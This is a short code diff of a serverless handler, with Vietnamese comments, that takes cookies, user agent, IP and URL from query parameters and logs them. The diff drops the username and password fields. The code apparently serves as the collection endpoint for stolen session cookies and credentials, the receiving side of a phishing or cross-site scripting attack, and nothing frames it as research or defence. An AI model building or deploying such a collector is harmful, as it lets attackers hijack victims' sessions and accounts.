@@ -5,16 +5,12 @@ exports.handler = async (event, context) => {
   const userAgent = event.queryStringParameters.userAgent || "No user agent";
   const userIP = event.queryStringParameters.userIP || "No IP";
   const url = event.queryStringParameters.url || "No URL";
-  const username = event.queryStringParameters.username || "No username";
-  const password = event.queryStringParameters.password || "No password";
 
   // Ghi thông tin vào log
   console.log(`Cookies: ${cookies}`);
   console.log(`User Agent: ${userAgent}`);
   console.log(`IP: ${userIP}`);
-  console.log(`URL (Original URL): ${url}`);
-  console.log(`Username: ${username}`);
-  console.log(`Password: ${password}`);
+  console.log(`URL: ${url}`);
 
   return {
     statusCode: 200,
